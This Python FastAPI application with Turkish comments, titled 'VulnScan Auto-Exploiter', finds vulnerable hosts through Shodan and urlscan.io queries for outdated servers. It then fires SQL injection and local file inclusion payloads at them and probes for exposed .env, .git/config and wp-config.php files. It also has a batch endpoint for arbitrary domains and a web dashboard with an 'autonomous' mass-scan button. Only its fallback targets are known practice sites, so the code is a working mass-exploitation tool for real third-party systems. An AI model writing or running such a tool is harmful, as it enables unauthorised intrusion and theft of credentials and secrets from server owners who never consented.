from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import sqlite3
import urllib.parse
import os
import logging
import time
import random
from typing import List
import uvicorn

# --- SİSTEM LOGLAMA AYARLARI ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger("VulnScan")

app = FastAPI(title="VulnScan Auto-Exploiter - OSINT Edition")

# --- VERİTABANI VE DİZİN AYARLARI ---
DATA_DIR = os.environ.get("DATA_DIR", "/var/data")
if not os.path.exists(DATA_DIR):
    try:
        os.makedirs(DATA_DIR)
    except Exception:
        DATA_DIR = "."

DB_PATH = os.path.join(DATA_DIR, "vulnscan.db")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute('PRAGMA journal_mode=WAL;')
    conn.execute('PRAGMA busy_timeout=5000;')
    return conn

def init_db():
    with get_db() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS scans (id INTEGER PRIMARY KEY, domain TEXT, result TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS findings 
                     (id INTEGER PRIMARY KEY, target_url TEXT, vuln_type TEXT, 
                      severity TEXT, evidence TEXT, timestamp TIMESTAMP)''')
        conn.commit()

init_db()

# --- WEBSOCKET CANLI LOG YÖNETİMİ ---
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: str):
        for connection in self.active_connections:
            try:
                await connection.send_text(message)
            except:
                pass

manager = ConnectionManager()

class WSHandler(logging.Handler):
    def emit(self, record):
        log_entry = self.format(record)
        try:
            loop = asyncio.get_running_loop()
            asyncio.run_coroutine_threadsafe(manager.broadcast(log_entry), loop)
        except RuntimeError:
            pass

ws_handler = WSHandler()
ws_handler.setFormatter(logging.Formatter('%(asctime)s | %(message)s', datefmt='%H:%M:%S'))
logger.addHandler(ws_handler)

# --- ZAFİYET LİSTELERİ VE AYARLAR ---
COMMON_PATHS = ["/.env", "/.git/config", "/wp-config.php", "/config.php", "/server-status"]
SQLI_PAYLOADS = ["'", "' OR 1=1 --", "1' AND SLEEP(5)--"]
SQL_ERRORS = ["you have an error in your sql syntax", "unclosed quotation mark", "mysql_fetch", "pg_query"]
LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../windows/win.ini", "php://filter/convert.base64-encode/resource=index"]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
}

# --- OTONOM HEDEF KEŞFİ (OSINT) ---
async def fetch_osint_targets(session):
    logger.info("OSINT motoru başlatıldı. Eski ve zafiyetli hedefler aranıyor...")
    targets = set()
    
    # 1. Shodan API (Eğer API Key varsa)
    shodan_api = os.environ.get("SHODAN_API_KEY")
    if shodan_api:
        try:
            # Eski Apache, açık dizinler ve zayıf yapılandırmalar için sorgular
            queries = ['http.title:"index of"', 'Server: Apache/2.2', 'X-Powered-By: PHP/5']
            for q in queries:
                encoded_q = urllib.parse.quote(q)
                url = f"https://api.shodan.io/shodan/host/search?key={shodan_api}&query={encoded_q}"
                async with session.get(url, timeout=15) as res:
                    if res.status == 200:
                        data = await res.json()
                        for match in data.get('matches', [])[:10]:
                            ip = match.get('ip_str')
                            port = match.get('port')
                            if port == 80: targets.add(f"http://{ip}")
                            elif port == 443: targets.add(f"https://{ip}")
        except Exception as e:
            logger.error(f"Shodan API Hatası: {e}")

    # 2. URLScan.io API (Geçmişte taranmış zayıf siteler)
    try:
        urlscan_url = "https://urlscan.io/api/v1/search/?q=task.tags:%22dns%22%20AND%20page.server:%22Apache/2.2%22&size=10"
        async with session.get(urlscan_url, timeout=15) as res:
            if res.status == 200:
                data = await res.json()
                for result in data.get('results', []):
                    page_url = result.get('page', {}).get('url')
                    if page_url and page_url.startswith("http"):
                        targets.add(page_url)
    except Exception as e:
        logger.error(f"URLScan API Hatası: {e}")

    # 3. Fallback (API'ler çalışmazsa veya boş dönerse test hedefleri)
    if not targets:
        logger.warning("OSINT API'lerinden veri alınamadı. Fallback hedefler yükleniyor.")
        targets.update([
            "http://testphp.vulnweb.com", 
            "http://demo.testfire.net",
            "http://zero.webappsecurity.com"
        ])
        
    logger.info(f"OSINT Keşfi Tamamlandı. Toplam {len(targets)} hedef bulundu.")
    return list(targets)

# --- TEK BİR SİTEYİ TARAMA VE SÖMÜRME FONKSİYONU ---
async def scan_and_exploit(session, target_url):
    report = {"target": target_url, "vulnerabilities": [], "exploits": []}
    
    try:
        logger.info(f"Analiz ediliyor: {target_url}")
        
        async with session.get(target_url, timeout=8, ssl=False, allow_redirects=True, headers=HEADERS) as response:
            server_header = response.headers.get("Server", "Bilinmiyor")
            powered_by = response.headers.get("X-Powered-By", "Bilinmiyor")
            
            if response.status in [403, 406, 429]:
                report["vulnerabilities"].append(f"WAF/Engel: HTTP {response.status}")
            
            if server_header != "Bilinmiyor":
                report["vulnerabilities"].append(f"Srv: {server_header} | PB: {powered_by}")
            
            if "Strict-Transport-Security" not in response.headers:
                report["vulnerabilities"].append("Eksik HSTS")
            if "X-Frame-Options" not in response.headers:
                report["vulnerabilities"].append("Eksik X-Frame-Options")

        # Gizli Dizin/Dosya Kontrolü
        for path in COMMON_PATHS:
            test_url = f"{target_url.rstrip('/')}{path}"
            async with session.get(test_url, timeout=5, ssl=False, headers=HEADERS) as res:
                if res.status == 200:
                    text = await res.text()
                    if "404" not in text and "not found" not in text.lower():
                        report["vulnerabilities"].append(f"Açık Dizin: {path}")
                        if path == "/.env" and "=" in text:
                            report["exploits"].append({"type": "Config Sızıntısı", "path": path, "evidence": text[:50] + "..."})
                            with get_db() as conn:
                                c = conn.cursor()
                                c.execute('''INSERT INTO findings (target_url, vuln_type, severity, evidence, timestamp) 
                                             VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', (target_url, "Config Sızıntısı", "CRITICAL", path))
                                conn.commit()

        # SQL Injection Kontrolü
        for payload in SQLI_PAYLOADS:
            test_url = f"{target_url.rstrip('/')}/?id={urllib.parse.quote(payload)}"
            start_time = time.time()
            async with session.get(test_url, timeout=10, ssl=False, headers=HEADERS) as res:
                response_time = time.time() - start_time
                text = (await res.text()).lower()
                
                if "sleep" in payload and response_time > 4.0:
                    report["exploits"].append({"type": "Time-Based SQLi", "payload": payload, "evidence": f"Gecikme: {response_time:.2f}s"})
                    logger.critical(f"SQLi (Time) Tespit: {target_url}")
                    with get_db() as conn:
                        c = conn.cursor()
                        c.execute('''INSERT INTO findings (target_url, vuln_type, severity, evidence, timestamp) 
                                     VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', (target_url, "Time-Based SQLi", "CRITICAL", payload))
                        conn.commit()
                    break

                for error in SQL_ERRORS:
                    if error in text:
                        report["exploits"].append({"type": "Error-Based SQLi", "payload": payload, "evidence": error})
                        logger.critical(f"SQLi (Error) Tespit: {target_url}")
                        with get_db() as conn:
                            c = conn.cursor()
                            c.execute('''INSERT INTO findings (target_url, vuln_type, severity, evidence, timestamp) 
                                         VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', (target_url, "Error-Based SQLi", "HIGH", error))
                            conn.commit()
                        break 

        # LFI Kontrolü
        for payload in LFI_PAYLOADS:
            test_url = f"{target_url.rstrip('/')}/?file={urllib.parse.quote(payload)}"
            async with session.get(test_url, timeout=8, ssl=False, headers=HEADERS) as res:
                text = await res.text()
                if "root:x:0:0" in text or "[extensions]" in text:
                    report["exploits"].append({"type": "LFI", "payload": payload, "evidence": "Sistem dosyası okundu!"})
                    logger.critical(f"LFI Tespit: {target_url}")
                    with get_db() as conn:
                        c = conn.cursor()
                        c.execute('''INSERT INTO findings (target_url, vuln_type, severity, evidence, timestamp) 
                                     VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', (target_url, "LFI", "CRITICAL", payload))
                        conn.commit()

    except Exception as e:
        report["error"] = str(e)
        logger.debug(f"Bağlantı Hatası: {target_url} - {str(e)}")
        
    return report

# --- OTONOM TARAMA API'Sİ ---
@app.post("/api/auto-scan")
async def auto_scan():
    logger.info("Otonom Tarama Süreci Başlatıldı.")
    
    async with aiohttp.ClientSession() as session:
        targets = await fetch_osint_targets(session)
        
        semaphore = asyncio.Semaphore(30)
        async def limited_scan(url):
            async with semaphore:
                return await scan_and_exploit(session, url)

        tasks = [limited_scan(url) for url in targets]
        results = await asyncio.gather(*tasks)
        
    logger.info("Otonom Tarama Süreci Tamamlandı.")
    return {"status": "success", "total_scanned": len(results), "results": results}

# --- MANUEL TARAMA API'Sİ ---
@app.post("/api/batch-scan")
async def batch_scan(domains: list[str]):
    semaphore = asyncio.Semaphore(50)
    
    async def limited_scan(session, url):
        async with semaphore:
            if not url.startswith("http"):
                url = "http://" + url
            return await scan_and_exploit(session, url)

    async with aiohttp.ClientSession() as session:
        tasks = [limited_scan(session, url) for url in domains]
        results = await asyncio.gather(*tasks)
        
    return {"status": "success", "total_scanned": len(results), "results": results}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)

@app.get("/", response_class=HTMLResponse)
def read_root():
    html_content = """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>VulnScan | Auto-Exploiter OSINT</title>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
        <style>
            :root {
                --bg: #0f1115; --panel: #15181e; --border: #2a2e39;
                --text: #d1d5db; --accent: #3b82f6; --danger: #ef4444;
                --warning: #f59e0b; --success: #10b981;
            }
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { background-color: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; }
            .header { width: 100%; max-width: 1100px; margin-bottom: 25px; display: flex; justify-content: space-between; align-items: flex-end; border-bottom: 1px solid var(--border); padding-bottom: 15px; }
            .header h1 { font-size: 1.6rem; font-weight: 600; color: #fff; letter-spacing: -0.5px; }
            .header p { color: #6b7280; font-size: 0.9rem; margin-top: 5px; }
            .main-container { width: 100%; max-width: 1100px; display: grid; grid-template-columns: 1fr; gap: 20px; }
            
            .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 20px; }
            .panel-title { font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; color: #9ca3af; margin-bottom: 15px; font-weight: 600; }
            
            textarea { width: 100%; height: 100px; background: var(--bg); color: var(--text); border: 1px solid var(--border); border-radius: 6px; padding: 12px; font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; resize: vertical; outline: none; transition: border 0.2s; }
            textarea:focus { border-color: var(--accent); }
            
            .btn-group { display: flex; gap: 10px; margin-top: 15px; }
            button { flex: 1; padding: 12px 24px; border-radius: 6px; font-weight: 600; font-size: 0.95rem; cursor: pointer; transition: 0.2s; border: none; color: #fff; }
            .btn-primary { background: var(--accent); }
            .btn-primary:hover { background: #2563eb; }
            .btn-danger { background: var(--danger); }
            .btn-danger:hover { background: #dc2626; }
            button:disabled { background: #374151; cursor: not-allowed; color: #9ca3af; }

            #results-container { display: none; margin-top: 10px; }
            .site-card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; margin-bottom: 15px; overflow: hidden; }
            .site-header { background: #1c212b; padding: 12px 20px; font-family: 'JetBrains Mono', monospace; font-size: 0.95rem; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; }
            .site-body { padding: 20px; }
            .vuln-list { list-style: none; margin-bottom: 15px; }
            .vuln-item { font-size: 0.9rem; color: var(--warning); margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
            .exploit-box { background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.2); border-left: 3px solid var(--danger); border-radius: 4px; padding: 12px; margin-top: 10px; }
            .exploit-title { color: var(--danger); font-weight: 600; font-size: 0.9rem; margin-bottom: 6px; }
            .exploit-desc { font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; color: #fca5a5; word-break: break-all; }
            
            .terminal { background: #090a0c; border: 1px solid var(--border); border-radius: 8px; height: 250px; overflow-y: auto; padding: 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; line-height: 1.5; }
            .log-line { margin-bottom: 4px; }
            .log-time { color: #6b7280; }
            .log-info { color: var(--accent); }
            .log-warning { color: var(--warning); }
            .log-critical { color: var(--danger); font-weight: bold; }
            .log-error { color: var(--danger); }
        </style>
    </head>
    <body>
        <div class="header">
            <div>
                <h1>VulnScan Auto-Exploiter</h1>
                <p>OSINT Destekli Toplu Hedef Tarama ve Zafiyet Analiz Motoru</p>
            </div>
            <div style="font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; color: var(--success);">
                OTONOM MOD AKTİF
            </div>
        </div>

        <div class="main-container">
            <div class="panel">
                <div class="panel-title">Manuel Hedef Listesi</div>
                <textarea id="targetsInput" placeholder="http://testphp.vulnweb.com&#10;http://demo.testfire.net"></textarea>
                <div class="btn-group">
                    <button class="btn-primary" onclick="startBatchScan()" id="scanBtn">Manuel Tara</button>
                    <button class="btn-danger" onclick="startAutoScan()" id="autoScanBtn">OSINT Otonom Tara</button>
                </div>
            </div>

            <div id="results-container"></div>

            <div class="panel" style="padding: 0; overflow: hidden;">
                <div style="padding: 10px 15px; background: #1c212b; border-bottom: 1px solid var(--border); font-size: 0.85rem; color: #9ca3af; font-weight: 600;">KONSOL ÇIKTISI</div>
                <div id="terminal" class="terminal"></div>
            </div>
        </div>

        <script>
            const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            const ws = new WebSocket(protocol + window.location.host + "/ws");
            const terminal = document.getElementById('terminal');

            ws.onmessage = function(event) {
                const line = document.createElement("div");
                line.className = "log-line";
                
                let text = event.data;
                let time = "", msg = text;

                if (text.includes("|")) {
                    const parts = text.split("|");
                    time = parts[0].trim();
                    msg = parts.slice(1).join("|").trim();
                }

                let colorClass = "log-info";
                if (msg.includes("WARNING")) colorClass = "log-warning";
                if (msg.includes("CRITICAL")) colorClass = "log-critical";
                if (msg.includes("ERROR")) colorClass = "log-error";

                line.innerHTML = `<span class="log-time">[${time}]</span> <span class="${colorClass}">${msg}</span>`;
                terminal.appendChild(line);
                terminal.scrollTop = terminal.scrollHeight;
            };

            function renderResults(data) {
                const resultsContainer = document.getElementById('results-container');
                resultsContainer.style.display = "block";
                resultsContainer.innerHTML = "";

                data.results.forEach(site => {
                    let exploitsHtml = "";
                    if(site.exploits && site.exploits.length > 0) {
                        site.exploits.forEach(exp => {
                            exploitsHtml += `
                                <div class="exploit-box">
                                    <div class="exploit-title">Açık Tespit Edildi: ${exp.type}</div>
                                    <div class="exploit-desc">Payload: ${exp.payload || exp.path} <br> Kanıt: ${exp.evidence}</div>
                                </div>
                            `;
                        });
                    } else {
                        exploitsHtml = "<p style='color:var(--success); font-size:0.85rem; margin-top: 10px;'>Sömürülebilir bir açık bulunamadı.</p>";
                    }

                    let vulnsHtml = "";
                    if(site.vulnerabilities && site.vulnerabilities.length > 0) {
                        vulnsHtml = "<ul class='vuln-list'>" + site.vulnerabilities.map(v => `<li class='vuln-item'>${v}</li>`).join('') + "</ul>";
                    }

                    resultsContainer.innerHTML += `
                        <div class="site-card">
                            <div class="site-header">
                                <span>${site.target}</span>
                                <span style="color:${site.error ? 'var(--danger)' : 'var(--success)'}">${site.error ? 'HATA' : 'TAMAMLANDI'}</span>
                            </div>
                            <div class="site-body">${vulnsHtml}${exploitsHtml}</div>
                        </div>
                    `;
                });
            }

            async function startBatchScan() {
                const rawInput = document.getElementById('targetsInput').value;
                const domains = rawInput.split('\\n').map(d => d.trim()).filter(d => d);
                if(domains.length === 0) return alert("Lütfen hedef girin.");
                
                document.getElementById('scanBtn').disabled = true;
                document.getElementById('autoScanBtn').disabled = true;
                terminal.innerHTML = "";

                try {
                    const response = await fetch('/api/batch-scan', {
                        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(domains)
                    });
                    const data = await response.json();
                    renderResults(data);
                } catch (error) {
                    alert("Hata: " + error);
                } finally {
                    document.getElementById('scanBtn').disabled = false;
                    document.getElementById('autoScanBtn').disabled = false;
                }
            }

            async function startAutoScan() {
                document.getElementById('scanBtn').disabled = true;
                document.getElementById('autoScanBtn').disabled = true;
                terminal.innerHTML = "";
                document.getElementById('results-container').style.display = "none";

                try {
                    const response = await fetch('/api/auto-scan', { method: 'POST' });
                    const data = await response.json();
                    renderResults(data);
                } catch (error) {
                    alert("Hata: " + error);
                } finally {
                    document.getElementById('scanBtn').disabled = false;
                    document.getElementById('autoScanBtn').disabled = false;
                }
            }
        </script>
    </body>
    </html>
    """
    return html_content

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
